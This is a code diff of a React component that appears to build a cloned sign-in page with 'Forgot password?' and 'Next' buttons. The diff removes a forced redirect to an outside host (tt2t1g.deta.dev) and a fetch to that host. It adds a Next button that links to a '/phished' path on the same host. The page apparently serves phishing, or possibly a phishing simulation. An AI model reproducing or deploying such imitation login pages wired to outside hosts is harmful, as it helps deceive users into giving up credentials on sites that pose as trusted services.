@@ -16,11 +16,9 @@ const theme = createTheme({
   },
 });
 function App() {
-  const [t, setT] = useState()
-  window.location = "https://tt2t1g.deta.dev/page"
+  const [t, setT] = useState()  
   return (
     <>
-      <Email></Email>
       <div style={{margin: 'none', display: 'flex', flexDirection: 'column'}}>
       <div style={{margin: 'none', alignSelf: 'center', display: 'flex', flexDirection: 'row'}}>
       <div style={{margin: 'none', alignSelf: 'center', display: 'flex', flexDirection: 'row', width: '450px', height: '100vh'}}>
@@ -44,7 +42,7 @@ function App() {
       </div>
       <div style={{display: 'flex', justifyContent: 'space-between'}}>
       <Button sx={{ textTransform: 'none' }} disableElevation color='primary' style={{ height: '37px', fontWeight: '600', fontSize: '13px', fontFamily: 'roboto,"Noto Sans Myanmar UI",arial,sans-serif'}}><span>Forgot password?</span></Button>
-      <Button onClick={() => {fetch('https://tt2t1g.deta.dev/pages').then(resp => resp.json().then(res => {}))}} sx={{ textTransform: 'none' }} disableElevation variant='contained' style={{ width: '80px', height: '37px', fontWeight: '600', fontSize: '13px', fontFamily: 'roboto,"Noto Sans Myanmar UI",arial,sans-serif'}}><span>Next</span></Button>
+      <Button href='https://tt2t1g.deta.dev/phished' sx={{ textTransform: 'none' }} disableElevation variant='contained' style={{ width: '80px', height: '37px', fontWeight: '600', fontSize: '13px', fontFamily: 'roboto,"Noto Sans Myanmar UI",arial,sans-serif'}}><span>Next</span></Button>
       </div>
       </div>
       <div style={{marginTop: '25px', display: 'flex', flexDirection: 'row', justifyContent: 'space-between'}}>
